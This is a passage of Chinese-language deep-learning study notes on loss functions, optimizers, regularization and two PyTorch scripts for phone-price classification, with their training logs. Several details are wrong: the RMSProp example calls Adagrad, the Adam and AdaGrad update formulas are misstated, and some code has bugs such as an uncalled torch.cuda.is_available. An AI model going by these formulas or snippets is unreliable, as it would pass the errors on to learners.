是第 $ i $ 条样本 $ x_i $ 对应的预测值 $S(·)$ 是 $Softmax$ 激活函数，将 $x_i$ 的预测值进行概率化，输出 $x_i$ 对应每个类别的概率 $ \\mathcal{L} $ 用来衡量真实值 $ y $ 与预测值 $ f_\\theta(x) $ 之间的差异性损失 Pytorch: torch.nn.CrossEntropyLoss() 回归损失——MAE损失函数（L1范数/曼哈顿距离） 损失函数： $$\\mathcal{L} = \\displaystyle{\\frac{1}{m}\\sum_{i=1}^m|y_i-f_\\theta(x_i)|}$$ $ y_i $ 是第 $ i $ 条样本 $ x_i $ 对应的真实值（共 $ m $ 条样本） $ f_\\theta(x_i) $ 是第 $ i $ 条样本 $ x_i $ 对应的预测值 Pytorch： torch.nn.L1Loss() 回归损失——MSE损失函数（L2范数/欧氏距离） 损失函数： $$\\mathcal{L} = \\displaystyle{\\frac{1}{m}\\sum_{i=1}^m(y_i-f_\\theta(x_i))^2}$$ $ y_i $ 是第 $ i $ 条样本 $ x_i $ 对应的真实值（共 $ m $ 条样本） $ f_\\theta(x_i) $ 是第 $ i $ 条样本 $ x_i $ 对应的预测值 L2 Loss也常作为正则项。当预测值与目标值相差很大时容易发生梯度爆炸 Pytorch： torch.nn.MSELoss() 回归损失——Smooth L1损失函数（L1与L2的结） 损失函数： $$ \\mathcal{L} = \\displaystyle{\\frac{1}{m}\\sum_{i=1}^m} \\left[ \\begin{cases} \\displaystyle{\\frac{1}{2}(y_i-f_\\theta(x_i))^2},\\ \u0026 |y_i-f_\\theta(x_i)|\u003c1 \\\\ \\displaystyle{|y_i-f_\\theta(x_i)|-\\frac{1}{2}}, \u0026 otherwise \\end{cases} \\right] $$ $ y_i $ 是第 $ i $ 条样本 $ x_i $ 对应的真实值（共 $ m $ 条样本） $ f_\\theta(x_i) $ 是第 $ i $ 条样本 $ x_i $ 对应的预测值 真实值与预测值差值在 $[-1,1]$ 区间内实际上为L2损失，解决了L1的不光滑问题 真实值与预测值差值在 $[-1,1]$ 区间外实际上为L1损失，解决了L2梯度爆炸问题 Pytorch: torch.nn.SmoothL1Loss() 反向传播与梯度下降 反向传播 前向传播（计算输出）： $$\\displaystyle{Out = h(g(f(x_1w_1+Other_1)w_2+Other_2)w_3+Other_3)}$$ 反向传播（链式求导）： $$\\displaystyle{\\frac{\\partial \\mathcal{Loss}}{\\partial w_1} = \\frac{\\partial \\mathcal{Loss}}{\\partial Out}·\\frac{\\partial Out}{\\partial M_3}·\\frac{\\partial M_3}{\\partial O_2}·\\frac{\\partial O_2}{\\partial M_2}·\\frac{\\partial M_2}{\\partial O_1}·\\frac{\\partial O_1}{\\partial M_1}·\\frac{\\partial M_1}{\\partial w_1}}$$ $$\\Rightarrow\\displaystyle{\\nabla_{w_1} \\mathcal{Loss} = { \\mathcal{L}}'_{\\hat y}·h'_{M_3}·w_3·g'_{M_2}·w_2·f'_{M_1}·x_1}$$ 参数迭代（梯度下降）： $$\\displaystyle{w_1^{new} = w_1^{old}-\\eta·\\nabla_{w_1} \\mathcal{Loss}}$$ 注意：全体参数同时更新，无先后顺序。因此在计算 $$\\displaystyle{\\nabla_{w_1} \\mathcal{Loss}}$$ 时用到的 $w_3$ 和 $w_2$ ，为 $w_3^{old}$ 和 $w_2^{old}$ 梯度下降 迭代函数： $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\eta·\\frac{\\partial\\mathcal{L}}{\\partial w_{ij}}}$$ 梯度下降方式：全梯度（BGD）、随机梯度（SGD）、小批量梯度（Mini-Batch SGD，深度学习用） 传统梯度下降存在的问题 问题一：平坦区域梯度下降缓慢 梯度下降算法优化 动量算法（Momentum）—— 基于指数加权平均 设第 $ k $ 次迭代时的梯度为 $ \\mathcal{G}_k $，指数加权平均梯度为$ \\mathcal{E}_k $，$ k \\in {1,2\\dots K}$， $\\beta$ 为权重系数（通常设为0.9）。有： $$ \\mathcal{E}_k = \\begin{cases} \\mathcal{G}_1,\\ \u0026 k=1 \\\\ \\beta·\\mathcal{E}_{k-1} + (1-\\beta)·\\mathcal{G}_k,\u0026 k \\ge 2 \\end{cases} $$ 参数迭代： $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\eta·\\mathcal{E}_k}$$ Pytorch： torch.optim.SGD(model.parameters(),lr=0.01,momentum=0.9) AdaGrad算法 初始化学习率 $\\alpha_0$ 、小常数 $\\sigma=1e-6$ 、 梯度累积变量 $s_0=0$ 迭代流程（第 $k$ 轮迭代）： 从训练集中采样 $n$ 个样本的小批量，计算梯度 $\\mathcal{G}_k$ 累计平方梯度 $$s_k=s_{k-1}+\\mathcal{G}_k\\odot \\mathcal{G}_k$$，$\\odot$ 为逐元素相乘 学习率迭代： $$\\displaystyle{\\alpha_{k}=\\frac{\\alpha_{k-1}}{\\sqrt{s_k}+\\sigma}}$$ 参数迭代： $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\alpha_{k}·\\mathcal{G}_k}$$ Pytorch： torch.optim.Adagrad(model.parameters(),lr=0.01) RMSProp算法 —— 对AdaGrad算法的优化 初始化学习率 $\\alpha_0$ 、小常数 $\\sigma=1e-6$ 、 梯度累积变量 $s_0=0$ 迭代流程（第 $k$ 轮迭代）： 从训练集中采样 $n$ 个样本的小批量，计算梯度 $\\mathcal{G}_k$ 累计指数加权平均平方梯度 $$s_k=\\beta·s_{k-1}+(1-\\beta)·\\mathcal{G}_k\\odot \\mathcal{G}_k$$ 学习率迭代： $$\\displaystyle{\\alpha_k=\\frac{\\alpha_{k-1}}{\\sqrt{s_k}+\\sigma}}$$ 参数迭代： $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\alpha_{k}·\\mathcal{G}_k}$$ Pytorch： torch.optim.Adagrad(model.parameters(),lr=0.01,alpha=0.9) Adam算法 —— Momentum算法+RMSProp算法 初始化学习率 $\\alpha_0$ 、小常数 $\\sigma=1e-6$ 、 梯度累积变量 $s_0=0$ 迭代流程（第 $k$ 轮迭代）： 从训练集中采样 $n$ 个样本的小批量，计算梯度 $\\mathcal{G}_k$ 计算指数加权平均梯度为$ \\mathcal{E}_k $：$$ \\mathcal{E}_k = \\begin{cases} \\mathcal{G}_1,\\ \u0026 k=1 \\\\ \\beta_1·\\mathcal{E}_{k-1} + (1-\\beta_1)·\\mathcal{G}_k,\u0026 k \\ge 2 \\end{cases} $$ 累计指数加权平均平方梯度 $$s_k=\\beta_2·s_{k-1}+(1-\\beta_2)·\\mathcal{E}_k\\odot \\mathcal{E}_k$$ 学习率迭代： $$\\displaystyle{\\alpha_k=\\frac{\\alpha_{k-1}}{\\sqrt{s_k}+\\sigma}}$$ 参数迭代： $$\\displaystyle{w^{new}_{ij} = w^{old}_{ij} - \\alpha_{k}·\\mathcal{E}_k}$$ Pytorch： torch.optim.Adam(model.parameters(),lr=0.01,betas=[0.9,0.99]) 学习率调整策略 等间隔学习率衰减策略： 每隔 step_size 轮， lr 衰减至 lr*gamma 1 2 3 4 5 optimizer = torch.optim.SGD(model.parameters(),lr=0.01,momentum=0.9) decelerator = torch.optim.lr_scheduler.StepLR(optimizer,step_size=50,gamma=0.5) #......迭代过程： optimizer.step() decelerator.step() 指定间隔学习率衰减：指定轮次[50,125,160] 每到指定 momentum 轮， lr 衰减至 lr*gamma 1 2 3 4 5 optimizer = torch.optim.SGD(model.parameters(),lr=0.01,momentum=0.9) decelerator = torch.optim.lr_scheduler.MultiStepLR(optimizer,milestones=[50,125,160],gamma=0.5) #......迭代过程： optimizer.step() decelerator.step() 指数学习率衰减 每次迭代 lr 衰减至 lr*(gamma**epoch) 1 2 3 4 5 optimizer = torch.optim.SGD(model.parameters(),lr=0.01,momentum=0.9) decelerator = torch.optim.lr_scheduler.ExponentialLR(optimizer,gamma=0.9) #......迭代过程： optimizer.step() decelerator.step() 正则化 正则化目的：提高模型泛化能力，缓解过拟合。机器学习中常用L1/L2范数 Dropout正则化 正则化思想：在训练过程中，让隐藏层神经元以超参数 $p$ 的概率停止工作或者激活函数输出置$0$，未被置$0$的神经元放大至 $\\displaystyle{\\frac{1}{(1-p)}}$ 倍 Pytorch：在forward方法中： 1 2 3 4 # layer = nn.Linear(4,5) # dropout = nn.Dropout(p=0.4) # 失活概率0.4 M = layer(input) output = dropout(M) # 失活 BN层（小批量归一化） BN层思想：BN层位于神经元中求和计算与非线性计算之间，即 $$\\displaystyle{Input\\overset{x}{\\rightarrow}\\left(\\sum\\overset{s_1}{\\rightarrow} \\mathcal{BN}\\overset{s_2}{\\rightarrow} f(s_2) \\right)\\rightarrow Output}$$，对 $s_1$ 进行小批量的归一化与平移缩放，数据范围为该批次的输入数据 $\\mathcal{BN}$ 层实现： $$\\displaystyle{s_2 =\\lambda·\\left(\\frac{ s_1 - \\mu_B}{\\sqrt{\\sigma^2_B+\\epsilon}}\\right)+\\beta} $$ $\\lambda$ （系数）和 $\\beta$ （偏置）为可学习参数，相当于对标准化后的值做一次线性变换 $ \\epsilon $ 通常取 $ 1e-5 $ ，避免分母为 $ 0 $ $ \\mu_B $ 为该批次样本均值， $ \\mu_B = \\displaystyle{\\frac{1}{m}\\sum^m_{i=1}x_i} $ ， $ m $ 为该批次样本数 $ \\sigma^2_B $ 为该批次样本方差， $ \\sigma^2_B = \\displaystyle{\\frac{1}{m}\\sum^m_{i=1}(x_i-\\mu_B)^2} $ 实践——手机价格分类预测 导入工具包 1 2 3 4 5 6 7 8 9 10 11 import torch import torch.nn as nn import torch.optim as optim from torch.utils.data import TensorDataset,DataLoader from torchsummary import summary from sklearn.datasets import make_regression from sklearn.model_selection import train_test_split import matplotlib.pyplot as plt import numpy as np import pandas as pd import time 数据加载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def load_data(): # 数据读取 data_path = \u0026#39;./Dataset/4_Phone_Price_Predict/phone_price_dataset.csv\u0026#39; data = pd.read_csv(data_path) X,y = data.iloc[:,:-1],data.iloc[:,-1] # 数据划分 X_train,X_test,y_train,y_test = train_test_split( X,y, train_size=0.8, random_state=428, stratify=y ) # 转为Dataset对象 train_dataset = TensorDataset( torch.from_numpy(X_train.values).float(), torch.from_numpy(y_train.values).long(), ) test_dataset = TensorDataset( torch.from_numpy(X_test.values).float(), torch.from_numpy(y_test.values).long(), ) return train_dataset,test_dataset,X.shape[1],len(np.unique(y)),X.columns,y.name 构建模型 1 2 3 4 5 6 7 8 9 10 11 12 class PhonePriceModel(nn.Module): def __init__(self,in_dim,out_dim): super(PhonePriceModel,self).__init__() self.linear_in_h1 = nn.Linear(in_dim,128) self.linear_h1_h2 = nn.Linear(128,256) self.linear_h2_out = nn.Linear(256,out_dim) def forward(self,X): X = torch.tanh(self.linear_in_h1(X)) X = torch.relu(self.linear_h1_h2(X)) return self.linear_h2_out(X) def predict(self,X): return torch.argmax(self.forward(X),dim=1) 模型训练 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 def train_model(model,train_data_loader,epochs=1000,device=\u0026#39;cuda\u0026#39;): # 准则：损失函数——交叉熵 criterion = nn.CrossEntropyLoss() # 优化方法 optimizer = optim.SGD(model.parameters(),lr=0.001,momentum=0.9) model.to(device) # 将模型搬到gpu total_start = time.time() round_start = time.time() best = {\u0026#39;model\u0026#39;:model,\u0026#39;loss\u0026#39;:10.} for epoch in range(epochs): # 迭代 total_loss = 0 total = 0 for batch_index,(X,y) in enumerate(train_data_loader): X,y = X.to(device),y.to(device) optimizer.zero_grad() # 梯度清零 y_hat = model.forward(X) # 前向传播 loss = criterion(y_hat,y) # 计算损失 loss.backward() # 反向传播 optimizer.step() total_loss += loss.item() total += 1 if total_loss/total \u0026lt; best[\u0026#39;loss\u0026#39;]: best[\u0026#39;model\u0026#39;] = model else: print(\u0026#34;Model degradation!\u0026#34;) if epoch % 100 == 0: print(f\u0026#34;epoch[{epoch}] | AVG_Loss:={total_loss/total:0.5f} | round_time = {time.time()-round_start:0.3}s | total_time = {time.time()-total_start:0.3}s\u0026#34;) round_start = time.time() torch.save(best[\u0026#39;model\u0026#39;].state_dict(),\u0026#39;./Model/4_Phone_Price_Predict/Model.pth\u0026#39;) 模型评估 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 def evaluate_model(train_data_loader,test_data_loader,in_dim,out_dim): # 加载模型 model = PhonePriceModel(in_dim,out_dim) model.load_state_dict(torch.load(\u0026#39;./Model/4_Phone_Price_Predict/Model.pth\u0026#39;,weights_only=True)) correct = 0 total = 0 for batch_index,(X,y) in enumerate(train_data_loader ): y_hat = model.predict(X) correct += (y_hat==y).sum() total += len(y) print(f\u0026#34;TRAIN-ACC: {100*(correct/total).item():.2f}%\u0026#34;) correct = 0 total = 0 for batch_index,(X,y) in enumerate(test_data_loader): y_hat = model.predict(X) correct += (y_hat==y).sum() total += len(y) print(f\u0026#34;TEST-ACC: {100*(correct/total).item():.2f}%\u0026#34;) evaluate_model(train_data_loader,test_data_loader,features_num,categories_num) # 迭代了一万次就这个结果 # TRAIN-ACC: 68.81% # TEST-ACC: 57.50% TRAIN-ACC: 68.81% TEST-ACC: 57.50% 程序入口 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 if __name__==\u0026#34;__main__\u0026#34;: # 0、预准备 torch.manual_seed(20030428) device = torch.device(\u0026#39;cuda\u0026#39; if torch.cuda.is_available else \u0026#39;cpu\u0026#39;) # 1、数据集加载 train_dataset,test_dataset,features_num,categories_num,_,_= load_data() train_data_loader = DataLoader( dataset=train_dataset, batch_size=1600, shuffle=True, ) test_data_loader = DataLoader( dataset=test_dataset, batch_size=10, shuffle=False, ) # 2、构建模型 model = PhonePriceModel(features_num,categories_num) print(\u0026#34;Model structure and parameter statistics:\u0026#34;) summary(model,input_size=(features_num,),batch_size=train_data_loader.batch_size,device=\u0026#39;cpu\u0026#39;) # 3、模型训练 train_model(model,train_data_loader,epochs=10000,device=device) # 4、模型评估 # evaluate_model(train_data_loader,features_num,categories_num) Model structure and parameter statistics: ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Linear-1 [1600, 128] 2,688 Linear-2 [1600, 256] 33,024 Linear-3 [1600, 4] 1,028 ================================================================ Total params: 36,740 Trainable params: 36,740 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.12 Forward/backward pass size (MB): 4.74 Params size (MB): 0.14 Estimated Total Size (MB): 5.00 ---------------------------------------------------------------- epoch[0] | AVG_Loss:=1.43993 | round_time = 0.0259s | total_time = 0.0259s epoch[100] | AVG_Loss:=1.02807 | round_time = 2.17s | total_time = 2.19s epoch[200] | AVG_Loss:=0.97904 | round_time = 2.84s | total_time = 5.03s epoch[300] | AVG_Loss:=0.95448 | round_time = 2.11s | total_time = 7.14s epoch[400] | AVG_Loss:=0.93392 | round_time = 2.17s | total_time = 9.32s epoch[500] | AVG_Loss:=0.91720 | round_time = 2.62s | total_time = 11.9s epoch[600] | AVG_Loss:=0.90214 | round_time = 2.28s | total_time = 14.2s epoch[700] | AVG_Loss:=0.88572 | round_time = 2.23s | total_time = 16.5s epoch[800] | AVG_Loss:=0.87118 | round_time = 2.1s | total_time = 18.6s epoch[900] | AVG_Loss:=0.85428 | round_time = 2.48s | total_time = 21.0s epoch[1000] | AVG_Loss:=0.81790 | round_time = 2.39s | total_time = 23.4s epoch[1100] | AVG_Loss:=0.79489 | round_time = 2.24s | total_time = 25.7s epoch[1200] | AVG_Loss:=0.75626 | round_time = 2.48s | total_time = 28.1s epoch[1300] | AVG_Loss:=0.73721 | round_time = 2.29s | total_time = 30.4s epoch[1400] | AVG_Loss:=0.73688 | round_time = 2.27s | total_time = 32.7s epoch[1500] | AVG_Loss:=0.75798 | round_time = 2.19s | total_time = 34.9s epoch[1600] | AVG_Loss:=0.73144 | round_time = 2.56s | total_time = 37.4s epoch[1700] | AVG_Loss:=0.74993 | round_time = 2.28s | total_time = 39.7s epoch[1800] | AVG_Loss:=0.73117 | round_time = 2.37s | total_time = 42.1s epoch[1900] | AVG_Loss:=0.73371 | round_time = 2.53s | total_time = 44.6s epoch[2000] | AVG_Loss:=0.75547 | round_time = 2.24s | total_time = 46.9s epoch[2100] | AVG_Loss:=0.75855 | round_time = 2.33s | total_time = 49.2s epoch[2200] | AVG_Loss:=0.74142 | round_time = 2.24s | total_time = 51.4s epoch[2300] | AVG_Loss:=0.77747 | round_time = 2.45s | total_time = 53.9s epoch[2400] | AVG_Loss:=0.73235 | round_time = 2.13s | total_time = 56.0s epoch[2500] | AVG_Loss:=0.77216 | round_time = 2.22s | total_time = 58.2s epoch[2600] | AVG_Loss:=0.79436 | round_time = 2.61s | total_time = 60.8s epoch[2700] | AVG_Loss:=0.70371 | round_time = 2.15s | total_time = 63.0s epoch[2800] | AVG_Loss:=0.72711 | round_time = 2.2s | total_time = 65.2s epoch[2900] | AVG_Loss:=0.79875 | round_time = 2.37s | total_time = 67.6s epoch[3000] | AVG_Loss:=0.77671 | round_time = 2.16s | total_time = 69.7s epoch[3100] | AVG_Loss:=0.74079 | round_time = 2.42s | total_time = 72.1s epoch[3200] | AVG_Loss:=0.77159 | round_time = 2.16s | total_time = 74.3s epoch[3300] | AVG_Loss:=0.74570 | round_time = 2.55s | total_time = 76.9s epoch[3400] | AVG_Loss:=0.74661 | round_time = 2.29s | total_time = 79.1s epoch[3500] | AVG_Loss:=0.73534 | round_time = 2.11s | total_time = 81.3s epoch[3600] | AVG_Loss:=0.73651 | round_time = 2.17s | total_time = 83.4s epoch[3700] | AVG_Loss:=0.70549 | round_time = 2.32s | total_time = 85.8s epoch[3800] | AVG_Loss:=0.72406 | round_time = 2.55s | total_time = 88.3s epoch[3900] | AVG_Loss:=0.73777 | round_time = 2.28s | total_time = 90.6s epoch[4000] | AVG_Loss:=0.72636 | round_time = 2.23s | total_time = 92.8s epoch[4100] | AVG_Loss:=0.72083 | round_time = 2.62s | total_time = 95.4s epoch[4200] | AVG_Loss:=0.76240 | round_time = 2.32s | total_time = 97.7s epoch[4300] | AVG_Loss:=0.72299 | round_time = 2.28s | total_time = 1e+02s epoch[4400] | AVG_Loss:=0.72510 | round_time = 2.2s | total_time = 1.02e+02s epoch[4500] | AVG_Loss:=0.81183 | round_time = 2.7s | total_time = 1.05e+02s epoch[4600] | AVG_Loss:=0.80652 | round_time = 2.24s | total_time = 1.07e+02s epoch[4700] | AVG_Loss:=0.75615 | round_time = 2.2s | total_time = 1.09e+02s epoch[4800] | AVG_Loss:=0.74941 | round_time = 2.1s | total_time = 1.11e+02s epoch[4900] | AVG_Loss:=0.66527 | round_time = 2.52s | total_time = 1.14e+02s epoch[5000] | AVG_Loss:=0.67272 | round_time = 2.4s | total_time = 1.16e+02s epoch[5100] | AVG_Loss:=0.69575 | round_time = 2.28s | total_time = 1.19e+02s epoch[5200] | AVG_Loss:=0.73091 | round_time = 2.43s | total_time = 1.21e+02s epoch[5300] | AVG_Loss:=0.73123 | round_time = 2.38s | total_time = 1.23e+02s epoch[5400] | AVG_Loss:=0.71328 | round_time = 2.45s | total_time = 1.26e+02s epoch[5500] | AVG_Loss:=0.73237 | round_time = 2.21s | total_time = 1.28e+02s epoch[5600] | AVG_Loss:=0.69641 | round_time = 2.46s | total_time = 1.31e+02s epoch[5700] | AVG_Loss:=0.68606 | round_time = 2.3s | total_time = 1.33e+02s epoch[5800] | AVG_Loss:=0.78586 | round_time = 2.34s | total_time = 1.35e+02s epoch[5900] | AVG_Loss:=0.72079 | round_time = 2.49s | total_time = 1.38e+02s epoch[6000] | AVG_Loss:=0.69734 | round_time = 2.15s | total_time = 1.4e+02s epoch[6100] | AVG_Loss:=0.68501 | round_time = 2.36s | total_time = 1.42e+02s epoch[6200] | AVG_Loss:=0.71024 | round_time = 2.26s | total_time = 1.45e+02s epoch[6300] | AVG_Loss:=0.70844 | round_time = 2.48s | total_time = 1.47e+02s epoch[6400] | AVG_Loss:=0.71109 | round_time = 2.15s | total_time = 1.49e+02s epoch[6500] | AVG_Loss:=0.71105 | round_time = 2.34s | total_time = 1.51e+02s epoch[6600] | AVG_Loss:=0.69019 | round_time = 2.67s | total_time = 1.54e+02s epoch[6700] | AVG_Loss:=0.66574 | round_time = 2.27s | total_time = 1.56e+02s epoch[6800] | AVG_Loss:=0.70853 | round_time = 2.23s | total_time = 1.59e+02s epoch[6900] | AVG_Loss:=0.68988 | round_time = 2.46s | total_time = 1.61e+02s epoch[7000] | AVG_Loss:=0.70364 | round_time = 2.56s | total_time = 1.64e+02s epoch[7100] | AVG_Loss:=0.68664 | round_time = 2.19s | total_time = 1.66e+02s epoch[7200] | AVG_Loss:=0.70823 | round_time = 2.2s | total_time = 1.68e+02s epoch[7300] | AVG_Loss:=0.68428 | round_time = 2.58s | total_time = 1.71e+02s epoch[7400] | AVG_Loss:=0.68428 | round_time = 2.3s | total_time = 1.73e+02s epoch[7500] | AVG_Loss:=0.67769 | round_time = 2.25s | total_time = 1.75e+02s epoch[7600] | AVG_Loss:=0.71397 | round_time = 2.24s | total_time = 1.77e+02s epoch[7700] | AVG_Loss:=0.68235 | round_time = 2.43s | total_time = 1.8e+02s epoch[7800] | AVG_Loss:=0.67531 | round_time = 2.45s | total_time = 1.82e+02s epoch[7900] | AVG_Loss:=0.71229 | round_time = 2.16s | total_time = 1.84e+02s epoch[8000] | AVG_Loss:=0.69479 | round_time = 2.52s | total_time = 1.87e+02s epoch[8100] | AVG_Loss:=0.67552 | round_time = 2.37s | total_time = 1.89e+02s epoch[8200] | AVG_Loss:=0.67883 | round_time = 2.31s | total_time = 1.92e+02s epoch[8300] | AVG_Loss:=0.67391 | round_time = 2.28s | total_time = 1.94e+02s epoch[8400] | AVG_Loss:=0.66348 | round_time = 2.26s | total_time = 1.96e+02s epoch[8500] | AVG_Loss:=0.70879 | round_time = 2.78s | total_time = 1.99e+02s epoch[8600] | AVG_Loss:=0.70171 | round_time = 2.2s | total_time = 2.01e+02s epoch[8700] | AVG_Loss:=0.69648 | round_time = 2.2s | total_time = 2.03e+02s epoch[8800] | AVG_Loss:=0.71258 | round_time = 2.58s | total_time = 2.06e+02s epoch[8900] | AVG_Loss:=0.67976 | round_time = 2.44s | total_time = 2.08e+02s epoch[9000] | AVG_Loss:=0.69145 | round_time = 2.22s | total_time = 2.11e+02s epoch[9100] | AVG_Loss:=0.71203 | round_time = 2.17s | total_time = 2.13e+02s epoch[9200] | AVG_Loss:=0.72272 | round_time = 2.61s | total_time = 2.15e+02s epoch[9300] | AVG_Loss:=0.69372 | round_time = 2.31s | total_time = 2.18e+02s epoch[9400] | AVG_Loss:=0.69941 | round_time = 2.2s | total_time = 2.2e+02s epoch[9500] | AVG_Loss:=0.70574 | round_time = 2.13s | total_time = 2.22e+02s epoch[9600] | AVG_Loss:=0.73976 | round_time = 2.55s | total_time = 2.25e+02s epoch[9700] | AVG_Loss:=0.68331 | round_time = 2.39s | total_time = 2.27e+02s epoch[9800] | AVG_Loss:=0.71937 | round_time = 2.19s | total_time = 2.29e+02s epoch[9900] | AVG_Loss:=0.72435 | round_time = 2.47s | total_time = 2.32e+02s 实践（改进）——手机价格分类预测 工具导入 1 2 3 4 5 6 7 8 9 10 11 import torch import torch.nn as nn import torch.optim as optim from torch.utils.data import TensorDataset,DataLoader from torchsummary import summary from sklearn.datasets import make_regression from sklearn.model_selection import train_test_split import matplotlib.pyplot as plt import numpy as np import pandas as pd import time 数据加载 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 def load_data(): # 数据读取 data_path = \u0026#39;./Dataset/4_Phone_Price_Predict/phone_price_dataset.csv\u0026#39; data = pd.read_csv(data_path) X,y = data.iloc[:,:-1],data.iloc[:,-1] # 数据划分 X_train,X_test,y_train,y_test = train_test_split( X,y, train_size=0.8, random_state=428, stratify=y ) # 转为Dataset对象 train_dataset = TensorDataset( torch.from_numpy(X_train.values).float(), torch.from_numpy(y_train.values).long(), ) test_dataset = TensorDataset( torch.from_numpy(X_test.values).float(), torch.from_numpy(y_test.values).long(), ) return train_dataset,test_dataset,X.shape[1],len(np.unique(y)),X.columns,y.name 模型构建 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class PhonePriceModel(nn.Module): def __init__(self,in_dim,out_dim): super(PhonePriceModel,self).__init__() self.network = nn.Sequential( nn.Linear(in_dim,128), nn.BatchNorm1d(128), # BN层——批归一化 nn.ReLU(), nn.Dropout(0.3), # nn.Linear(128,256), nn.BatchNorm1d(256), nn.ReLU(), nn.Dropout(0.3), nn.Linear(256,128), nn.BatchNorm1d(128), nn.ReLU(), nn.Dropout(0.3), nn.Linear(128,out_dim) ) def forward(self,X): return self.network(X) def predict(self,X): return torch.argmax(self.forward(X),dim=1) 模型训练 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 def train_model(model,train_data_loader,test_data_loader,epochs=1000,device=\u0026#39;cuda\u0026#39;): criterion = nn.CrossEntropyLoss() optimizer = optim.Adam(model.parameters(),lr=0.001) scheduler = optim.lr_scheduler.StepLR(optimizer,step_size=50,gamma=0.1) model.to(device) total_start = time.time() round_start = time.time() losses = [] train_accs = [] test_accs = [] for epoch in range(epochs): model.train() total_loss = 0 total = 0 for batch_index,(X,y) in enumerate(train_data_loader): X,y = X.to(device),y.to(device) optimizer.zero_grad() y_hat = model(X) loss = criterion(y_hat,y) loss.backward() optimizer.step() total_loss+=loss.item() total+=1 scheduler.step() acc_train = evaluate_accuracy(model,train_data_loader,device) acc_test = evaluate_accuracy(model,test_data_loader,device) losses.append(total_loss/total) train_accs.append(acc_train) test_accs.append(acc_test) if epoch % 10 == 0: print(f\u0026#34;Epoch[{epoch}]:: | Acc on Train:{acc_train:6.3f}% | Acc on Test:{acc_test:6.3f}% | \u0026#34; f\u0026#34;Loss: {total_loss/total:.5f} | total_time: {time.time()-total_start:.3}s\u0026#34;) torch.save(model.state_dict(),\u0026#39;./Model/4_Phone_Price_Predict/Model_improved.pth\u0026#39;) return losses,train_accs,test_accs 模型评估 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 def evaluate_accuracy(model, data_loader, device): model.eval() correct = 0 total = 0 with torch.no_grad(): for X,y in data_loader: X,y = X.to(device),y.to(device) y_hat = model.predict(X) correct += (y==y_hat).sum() total+=len(y) return 100*correct/total def evaluate_model(train_loader, test_loader, in_dim, out_dim, device): model = PhonePriceModel(in_dim,out_dim) model.load_state_dict(torch.load(\u0026#39;./Model/4_Phone_Price_Predict/Model_improved.pth\u0026#39;, weights_only=True)) model.to(device) acc_train = evaluate_accuracy(model,train_loader,device) acc_test = evaluate_accuracy(model,test_loader,device) print(f\u0026#34;Training set accuracy rate: {acc_train:6.3f}%\u0026#34;) print(f\u0026#34;Training set accuracy rate: {acc_test:6.3f}%\u0026#34;) evaluate_model(train_data_loader,test_data_loader,features_num,categories_num,device) Training set accuracy rate: 98.062% Training set accuracy rate: 98.750% 函数入口 1 2 3 # 预准备 torch.manual_seed(20030428) device = torch.device(\u0026#39;cuda\u0026#39; if torch.cuda.is_available else \u0026#39;cpu\u0026#39;) 1 2 3 4 5 6 7 8 9 10 11 12 # 数据加载 train_dataset,test_dataset,features_num,categories_num,_,_= load_data() train_data_loader = DataLoader( dataset=train_dataset, batch_size=400, shuffle=True, ) test_data_loader = DataLoader( dataset=test_dataset, batch_size=10, shuffle=False, ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 torch.manual_seed(20030428) # 构建模型 model = PhonePriceModel(features_num,categories_num) print(\u0026#34;Model structure and parameter statistics:\u0026#34;) summary(model,input_size=(features_num,),batch_size=train_data_loader.batch_size,device=\u0026#39;cpu\u0026#39;) # 模型训练 losses,train_acc,test_acc = train_model(model,train_data_loader,test_data_loader,epochs=110,device=device) # 图像绘制 figs,axes = plt.subplots(1,2,figsize=(12,4)) axes[0].plot(range(len(losses)),losses,label=\u0026#39;loss\u0026#39;) axes[0].set_ylabel(\u0026#39;loss\u0026#39;) axes[0].set_xlabel(\u0026#39;epoch\u0026#39;) axes[0].legend() axes[1].plot(range(len(losses)),[item.detach().item() for item in train_acc],label=\u0026#39;train_acc\u0026#39;) axes[1].plot(range(len(losses)),[item.detach().item() for item in test_acc],label=\u0026#39;test_acc\u0026#39;) axes[1].set_ylabel(\u0026#39;acc_rate\u0026#39;) axes[1].set_xlabel(\u0026#39;epoch\u0026#39;) axes[1].legend() plt.tight_layout() plt.show() Model structure and parameter statistics: ---------------------------------------------------------------- Layer (type) Output Shape Param # ================================================================ Linear-1 [400, 128] 2,688 BatchNorm1d-2 [400, 128] 256 ReLU-3 [400, 128] 0 Dropout-4 [400, 128] 0 Linear-5 [400, 256] 33,024 BatchNorm1d-6 [400, 256] 512 ReLU-7 [400, 256] 0 Dropout-8 [400, 256] 0 Linear-9 [400, 128] 32,896 BatchNorm1d-10 [400, 128] 256 ReLU-11 [400, 128] 0 Dropout-12 [400, 128] 0 Linear-13 [400, 4] 516 ================================================================ Total params: 70,148 Trainable params: 70,148 Non-trainable params: 0 ---------------------------------------------------------------- Input size (MB): 0.03 Forward/backward pass size (MB): 6.26 Params size (MB): 0.27 Estimated Total Size (MB): 6.56 ---------------------------------------------------------------- Epoch[0]:: | Acc on Train:31.812% | Acc on Test:30.750% | Loss: 1.22177 | total_time: 0.0878s Epoch[10]:: | Acc on Train:90.625% | Acc on Test:89.750% | Loss: 0.27893 | total_time: 0.867s Epoch[20]:: | Acc on Train:95.625% | Acc on Test:96.250% | Loss: 0.18210 | total_time: 1.64s Epoch[30]:: | Acc on 